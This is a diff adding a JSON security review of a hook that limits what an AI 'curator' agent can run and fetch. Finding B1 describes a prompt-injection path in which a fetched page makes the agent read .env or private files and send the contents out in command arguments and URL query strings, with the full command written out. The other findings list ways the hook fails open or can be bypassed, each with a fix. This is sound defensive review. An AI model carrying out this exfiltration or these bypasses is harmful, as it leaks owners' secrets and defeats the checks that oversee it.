@@ -1,0 +1,91 @@
+{
+  "surface": "boundary",
+  "findings": [
+    {
+      "id": "B1",
+      "severity": "medium",
+      "where": ".claude/scripts/design/composer-bash-check.sh:317 (`Read|Grep|Glob) exit 0`) with :269 (`--url`) and :215 (no length cap on `--principle`/`--avoid`)",
+      "breaking_input": "A gallery page the curator WebFetches carries text telling it to Read a file outside the repo (a .env, or the owner's private legal directory under the home folder). It then runs: node .claude/scripts/design/design-refpack.mjs --brief lexos-p02 --source lapa-ninja --url \"https://lapa.ninja/a.png?d=<file text, up to 1 KB>\" --principle \"<file text, up to about 1.5 KB>\" --avoid \"x\". Every character is in CQ, the command is under 2000 bytes, and the ids pass the grammar, so the hook exits 0. The same text also leaves through WebFetch https://lapa.ninja/x?d=<text>, since the URL cap is 2048.",
+      "why": "The curator's Read, Grep and Glob are exempt from every rule, and the two channels the hook does allow carry free text. The principle and avoid values are written into a pack that the builder marks for commit, and this repo is public. The registry-host query string reaches a third party. The hook scopes the shape of the call but not the amount or origin of the data in it, so a prompt-injected page can turn 'read-only' tools into an exfiltration path.",
+      "fix": "Cap `--principle` and `--avoid` at about 300 characters each. Refuse a query string or fragment on `--url` and on a curator WebFetch (or cap the whole URL at about 300 bytes). Scope the curator's Read, Grep and Glob to the repo root, excluding dot-directories and env files, through the identity check the read boundary already has."
+    },
+    {
+      "id": "B2",
+      "severity": "medium",
+      "where": ".claude/scripts/design/composer-bash-check.sh:299 (`_out=\"$(cd \"$_root\" && node ... )\"; _rc=$?` in `_curator_fetch`)",
+      "breaking_input": "The hook runs with errexit in force (an exported SHELLOPTS containing errexit, or a `set -e` added to the header). The curator sends WebFetch https://lapa.ninja/private/drafts, whose robots.txt DISALLOWs it. Node exits 3, the failing substitution ends the script with exit 3 before `_rc=$?` or `_crefuse` run, and the harness treats any code other than 0 or 2 as a non-blocking error, so the fetch proceeds.",
+      "why": "The r1 B7 fix moved `_field command` into a conditional and wrote that no errexit in force can then end the script. The same construct in `_curator_fetch` was left as it was. DISALLOW is 3, UNREADABLE is 4 and USAGE is 1, and only 2 blocks, so under errexit every refusal the builder can give is read as allow. fixed-defects.md records B1 to B6 only, so B7, B9 and B11 are missing from the pattern list the next attacker gets, and that is how this twin survived.",
+      "fix": "`if _out=\"$(cd \"$_root\" && node .claude/scripts/design/design-refpack.mjs \"$@\" 2>&1 >/dev/null)\"; then _rc=0; else _rc=$?; fi`, and add the B7, B9 and B11 patterns to fixed-defects.md.",
+      "twin_of": "A subprocess result was ignored -> read status and error of every spawn whose failure matters."
+    },
+    {
+      "id": "B3",
+      "severity": "medium",
+      "where": ".claude/scripts/design/design-refpack.mjs:214 (`const s = Number(page.status)`) through the final `answer(0, \"ALLOW\", ...)`",
+      "breaking_input": "The page probe resolves with an object whose status is absent, null or non-numeric, for example `{ location: \"https://www.lapa.ninja/x\" }` or `{ status: null }`. `Number(undefined)` is NaN and `Number(null)` is 0, so neither `s >= 300` nor `s < 400` holds, the redirect branch is skipped, and the check answers ALLOW.",
+      "why": "The B2 fix made the exit code strict, but the page-status branch still reads a missing or garbled field as 'no redirect' and allows. The only success path has no allow-list of statuses. An error-shaped transport result becomes permission.",
+      "fix": "After the probe, require `Number.isInteger(s) && s >= 100 && s <= 599`, else `answer(EXIT.UNREADABLE, \"UNREADABLE\", ...)`. Allow only on a numeric status outside 300-399.",
+      "twin_of": "An absent field read as \"some other value\" and allowed -> an allow list, never a catch-all exit 0."
+    },
+    {
+      "id": "B4",
+      "severity": "low",
+      "where": ".claude/scripts/design/composer-bash-check.sh:269-270 (`--url) case \"$2\" in https://?*`), paired with design-refpack.mjs:191",
+      "breaking_input": "node .claude/scripts/design/design-refpack.mjs --brief b --source lapa-ninja --url \"https://lapa.ninja:8443/a.png\" --principle \"p\" --avoid \"a\"",
+      "why": "The r1 B9 fix (refuse a port or userinfo, because the registry binds hosts and not other listeners on them) was applied only in `checkBrowse`. The hook's second line of defence for `--url` checks only the https prefix, and none of the changed lines add the refusal to the pack-fetch path. Robots.txt and the licence are then judged on whatever service listens on that port of a registry host.",
+      "fix": "In the hook, take the authority (`${2#https://}` up to the first `/`, `?` or `#`) and refuse any `:` or `@` in it. Add the same port/userinfo refusal to the builder's pack path, and pin a fixture for each entry point.",
+      "twin_of": "A seam gate added to one CLI and not its sibling -> a fix to one entry point is checked in every entry point that shares the seam."
+    },
+    {
+      "id": "B5",
+      "severity": "low",
+      "where": ".claude/scripts/design/design-refpack.mjs:172 (`setTimeout(... BROWSE_DEADLINE_MS)`) and composer-bash-check.sh:299 (no external timeout around node)",
+      "breaking_input": "Any synchronous stretch over 60 s inside the check, for example a robots.txt at the transport's byte cap that is one Disallow line of tens of thousands of `*` wildcards followed by a literal, matched against a 2048-byte path, if any step of the matcher is superlinear.",
+      "why": "The 40 s cap is a JS timer in the same event loop as the work. A CPU-bound stretch starves it, node never answers, and the hook hits the harness's 60 s budget, which the ADR itself says is read as allow. The cap works only for async waits, and nothing outside node backs it up.",
+      "fix": "Enforce the deadline outside the checked process: have the hook's node call run under a parent that kills it, for example `spawnSync` with `timeout` and `killSignal`, and treat a kill as a refusal. Or add a real worker or child-process watchdog. Pin a fixture that blocks synchronously and assert exit 4."
+    },
+    {
+      "id": "B6",
+      "severity": "low",
+      "where": ".claude/scripts/design/composer-bash-check.sh:224 (`[ -n \"$_cur\" ] || _crefuse \"an empty quoted value is not a value.\"`)",
+      "breaking_input": "node .claude/scripts/design/design-refpack.mjs --brief b --source lapa-ninja --url \"https://lapa.ninja/x.png\" --principle \" \" --avoid \".\"",
+      "why": "Emptiness is tested on the raw quoted text before any trim. A single space or bare punctuation passes the hook, although the agent contract says neither value is ever empty. The hook is the only scope on the curator's Bash, and it relies on the builder to reject a blank principle after its own transforms.",
+      "fix": "Require at least one letter or digit in `--principle` and `--avoid` (for example `case \"$2\" in *[a-zA-Z0-9]*) ;; *) refuse;; esac`). Have the builder also validate the trimmed value that it writes.",
+      "twin_of": "Emptiness checked before sanitising -> validate the value that will be written, after every transform."
+    },
+    {
+      "id": "B7",
+      "severity": "low",
+      "where": "tests/design-composer-bash.bats (test 'ADR-1420 r1 B5/B9', the `grep -q 'ARC_DESIGN_OFFLINE:-}\" = \"1\" ...'` line)",
+      "breaking_input": "Ungate the forwarding by deleting the ARC_DESIGN_HOOK_SEAMS half of the condition in `_curator_fetch`, and leave the original two-variable condition text in a comment above it. The source grep still matches and CI stays green.",
+      "why": "The B5 fix, that seams need a second switch, is pinned only by a grep of the hook's source. The test never observes whether a fixture answer was used. A test that pins text passes on a comment and does not prove the code ran. The behaviour is reachable offline: with ARC_DESIGN_OFFLINE=1, no HOOK_SEAMS, and a disallow-all ROBOTS_FILE, the last curator-browse.log line must say `network` and not `fixture`, whatever the network answers.",
+      "fix": "Replace the grep with a behavioural case that unsets ARC_DESIGN_HOOK_SEAMS, sets a disallow-all ROBOTS_FILE, and asserts the log's via column is not `fixture` and the reason is not DISALLOW-from-fixture.",
+      "twin_of": "Test seams shipped ungated in a production CLI -> a fake transport needs an explicit env and stamps what it produced."
+    },
+    {
+      "id": "B8",
+      "severity": "low",
+      "where": "tests/design-composer-bash.bats (no case for r1 B2 or B4); design-refpack.mjs:205 and :207-219",
+      "breaking_input": "Revert the exit to `process.exit(EXIT[verdict])`, or delete the page probe (the `probe.get` block and the 3xx branch). All 44 tests, including every new curator test, stay green.",
+      "why": "The fixes for B2 (an unknown verdict must not exit 0) and B4 (a redirecting page is refused) have no fixture. fakeTransport cannot answer a 3xx for a page, and nothing drives a verdict outside EXIT. The ledger accepts the B4 gap, but the deletion test above shows two of the six code fixes can regress silently.",
+      "fix": "Add a fakeTransport page-status seam (an env or fixture file) and one case for a 301 page and one for a non-numeric status. Add a case where preflight is stubbed to return an unknown verdict, and assert exit 4."
+    },
+    {
+      "id": "B9",
+      "severity": "low",
+      "where": ".claude/scripts/design/composer-bash-check.sh:205-209 (`_field command ... 2000`) against :281 (`_field url ... 2048`)",
+      "breaking_input": "A real signed CDN image URL of about 1.6 KB, plus a 250-character principle and a 250-character avoid, gives a command of about 2.2 KB. The hook refuses it with 'the command is longer than 2000 bytes; no refpack call is', though the same URL is allowed through WebFetch.",
+      "why": "The 2000-byte cap was chosen for the command, but the URL inside it can legitimately be as long as the WebFetch cap of 2048. The message asserts a fact ('no refpack call is') that the two limits contradict. The curator cannot add screens from CDN-heavy galleries and gets no way to shorten the call.",
+      "fix": "Set the command cap from its parts (URL cap 2048 plus two value caps plus fixed text, about 3.2 KB), or state the maximum URL length in the agent's instructions and the refusal message.",
+      "twin_of": "A size guard written for one tool reached another through a new entry point -> a guard reused by a new caller is re-checked against that caller's real inputs."
+    },
+    {
+      "id": "B10",
+      "severity": "low",
+      "where": ".claude/scripts/design/composer-bash-check.sh:250 (`[ \"${1:-}\" = \"node\" ] && [ \"${2:-}\" = \".claude/scripts/design/design-refpack.mjs\" ]`), against :299 where `_curator_fetch` does `cd \"$_root\"`",
+      "breaking_input": "The Bash tool's persistent working directory was moved earlier by the main session into a nested checkout that holds its own older copy of .claude/scripts/design/design-refpack.mjs. The curator runs the exact allowed command. The hook approves the relative path, and bash runs that stale copy, which lacks the r1 guards.",
+      "why": "`_curator_fetch` pins the project root, but `_curator_bash` approves a path that is relative to whatever cwd the Bash call has. The hook never compares the payload's cwd to the root, so 'exactly one command, the pack builder' names a different file depending on where the shell happens to be.",
+      "fix": "Read `cwd` from the payload with `_field` and refuse unless it equals `_root` (compared after normalising Windows and POSIX forms). Or require the curator's Bash to arrive with no cwd change from the project root."
+    }
+  ]
+}
